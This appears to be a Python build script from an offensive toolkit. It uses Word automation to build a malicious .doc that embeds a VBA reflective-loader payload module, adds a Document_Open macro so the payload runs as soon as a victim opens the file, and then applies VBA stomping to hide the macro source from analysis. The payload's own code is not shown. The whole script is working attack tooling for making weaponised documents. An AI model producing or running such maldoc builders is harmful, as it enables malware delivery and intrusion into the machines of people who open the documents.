"""Rebuild just the ICMP loader doc with updated VBA config."""
import subprocess
import sys
import time
from pathlib import Path

import pythoncom
import win32com.client

ROOT = Path(__file__).resolve().parent.parent
PAYLOADS = ROOT / "src" / "payloads" / "ReflectiveLoader_ICMP"
STOMP = ROOT / "src" / "tools" / "vba-stomp" / "vba_stomp.py"
BAS = PAYLOADS / "ReflectiveLoader_ICMP_Standalone.bas"
DOC = PAYLOADS / "loader_icmp.doc"
MODULE_NAME = "RefLoader_ICMP"


def com_retry(func, retries=5, delay=1.0):
    for i in range(retries):
        try:
            return func()
        except pythoncom.com_error as e:
            if e.args[0] == -2147418111 and i < retries - 1:
                time.sleep(delay)
                continue
            raise


def main():
    if DOC.exists():
        DOC.unlink()
    stomped = DOC.with_stem(DOC.stem + "_stomped")
    if stomped.exists():
        stomped.unlink()

    bas_code = BAS.read_text(encoding="utf-8")
    lines = bas_code.splitlines(keepends=True)
    bas_code = "".join(l for l in lines if not l.strip().startswith("Attribute VB_Name"))

    print("[*] Starting Word...")
    word = win32com.client.DispatchEx("Word.Application")
    word.Visible = False
    word.DisplayAlerts = 0
    time.sleep(2)

    try:
        doc = com_retry(lambda: word.Documents.Add())
        time.sleep(1)
        com_retry(lambda: doc.SaveAs2(str(DOC), FileFormat=0))
        time.sleep(0.5)

        vb = doc.VBProject
        mod = vb.VBComponents.Add(1)
        mod.Name = MODULE_NAME
        mod.CodeModule.AddFromString(bas_code)

        td = vb.VBComponents("ThisDocument")
        td.CodeModule.AddFromString(f"Private Sub Document_Open()\n    {MODULE_NAME}.Run\nEnd Sub")

        com_retry(lambda: doc.Save())
        time.sleep(0.5)
        com_retry(lambda: doc.Close(SaveChanges=0))
        print(f"[+] Created {DOC.name}")

        result = subprocess.run(
            [sys.executable, str(STOMP), str(DOC), "-o", str(stomped)],
            capture_output=True, text=True,
        )
        if result.returncode == 0:
            print(f"[+] Stomped -> {stomped.name}")
        else:
            print(f"[!] Stomp failed")
            print(result.stdout)
    finally:
        try:
            word.Quit()
        except Exception:
            pass

    print("[*] Done")


if __name__ == "__main__":
    main()
